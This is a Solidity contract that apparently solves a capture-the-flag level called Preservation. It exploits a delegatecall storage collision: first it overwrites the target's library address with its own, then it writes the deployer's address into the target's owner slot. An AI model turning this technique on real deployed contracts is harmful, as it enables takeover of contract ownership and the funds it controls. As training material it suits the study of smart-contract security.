// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Preservation.sol';

contract PreservationSolution {
  address public preservation;
  address public deployer;
  address public owner; 

  constructor(address _preservation) public {
    preservation = _preservation;
    deployer = msg.sender;
  }

  function attack() external {
    uint256 contractAddressAsUint = uint256(uint160(address(this)));
    Preservation(preservation).setSecondTime(contractAddressAsUint);
    uint256 deployerAddressAsUint = uint256(uint160(deployer));
    Preservation(preservation).setFirstTime(deployerAddressAsUint);
  }

  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }

  fallback() external {
      
  }
}